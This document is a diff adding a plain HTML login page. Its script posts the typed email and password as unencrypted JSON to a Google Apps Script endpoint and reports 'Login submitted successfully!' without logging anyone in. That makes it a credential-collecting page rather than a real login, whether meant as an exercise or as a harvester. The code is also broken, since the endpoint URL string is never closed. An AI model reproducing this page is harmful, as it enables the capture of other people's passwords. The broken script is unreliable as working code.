@@ -1,0 +1,88 @@
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Login Form</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f2f5;
+      display: flex;
+      height: 100vh;
+      align-items: center;
+      justify-content: center;
+    }
+    .login-box {
+      background: #ffffff;
+      padding: 30px;
+      border-radius: 10px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+      width: 100%;
+      max-width: 400px;
+    }
+    .login-box h2 {
+      text-align: center;
+      margin-bottom: 25px;
+    }
+    .login-box input {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+    }
+    .login-box button {
+      width: 100%;
+      padding: 12px;
+      background-color: #4CAF50;
+      color: white;
+      border: none;
+      border-radius: 6px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .login-box button:hover {
+      background-color: #45a049;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <h2>Login Form</h2>
+    <form id="login-form">
+      <input type="email" id="email" name="email" placeholder="Enter your email" required>
+      <input type="password" id="password" name="password" placeholder="Enter your password" required>
+      <button type="submit">Login</button>
+    </form>
+    <p id="status"></p>
+  </div>  <script>
+    const scriptURL = 'https://script.google.com/macros/s/AKfycbzGXiDiXx21VdYXLGStW39602UZQh6-Epq5FuEwX7_mGdqNq-ivHyrgo8IzrvwH7vyouw/exec
+    const form = document.getElementById('login-form');
+    const status = document.getElementById('status');
+
+    form.addEventListener('submit', e => {
+      e.preventDefault();
+
+      const data = {
+        email: form.email.value,
+        password: form.password.value
+      };
+
+      fetch(scriptURL, {
+        method: 'POST',
+        body: JSON.stringify(data),
+        headers: {
+          'Content-Type': 'application/json'
+        }
+      })
+      .then(response => {
+        status.textContent = 'Login submitted successfully!';
+        form.reset();
+      })
+      .catch(error => {
+        status.textContent = 'Something went wrong!';
+        console.error('Error!', error.message);
+      });
+    });
+  </script></body>
+</html>
